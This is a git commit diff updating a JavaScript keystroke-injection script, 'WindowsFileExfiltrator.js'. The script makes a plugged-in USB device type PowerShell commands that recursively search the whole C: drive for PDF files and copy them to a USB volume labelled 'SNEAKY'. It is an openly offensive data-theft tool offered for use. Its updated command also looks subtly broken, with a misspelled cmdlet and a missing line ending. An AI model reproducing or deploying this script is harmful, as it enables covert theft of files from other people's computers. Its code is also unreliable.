952b96e556ccc89e64a733a35a92f846fdd44136
Calvin L <47407549+Coderdude112@users.noreply.github.com>
2020-04-21 09:36:14 -0600

    Update WindowsFileExfiltrator.js

--- HID-Scripts/WindowsFileExfiltrator.js
+++ HID-Scripts/WindowsFileExfiltrator.js
@@ -1,19 +1,21 @@
 // Windows File Exfiltrator
-// author: Saytonic https://youtu.be/I_BjCdJlCo4
-// edited by: Coderdude112 on GitHub 
+// Author: Saytonic https://youtu.be/I_BjCdJlCo4
+// Edited by: Coderdude112 on GitHub 
 // For config help go to Saytonic's video found here: https://youtu.be/I_BjCdJlCo4
+// This attack searches the SearchPath recursivly (All folders and sub-folders) for files that fit the FileTypes
 
 layout('us');			// Set keyboard layout to US
  
 press("GUI r");			// Opens a run command
 delay(500);
 type("powershell\n"); 	// Opens powershell
-delay(1000);
+delay(7000);
 
-var filetypes = ["jpg", "png", "txt"] // The file extensions that will be exfiltrated
+var FileTypes = ["*.pdf"] // The file extensions that will be exfiltrated
+var SearchPath = ["C:"]	       // The path to look for files NOTE: this will include ALL folders and sub-folders
 
-type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'sneaky' } | select name\n"); // Find the drive named "sneaky" and save it's path
-for (var i = 0; i < filetypes.length; i++) {
-    type("copy */*." + filetypes[i] + " $usbpath.name\n")} // Copys the files
+type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'SNEAKY' } | select name\n"); // Find the drive named "SNEAKY" and save it's path
+type("Get-Child-Item " + SearchPath + " -Recurse -Include " + FileTypes + " | ForEach-Object ` {copy $_ -Destination $usbPath}"); 
+// Searches and copies the files that meet the FileTypes variable and copy them to SNEAKY
 
 type("exit\n");  		// Closes out 
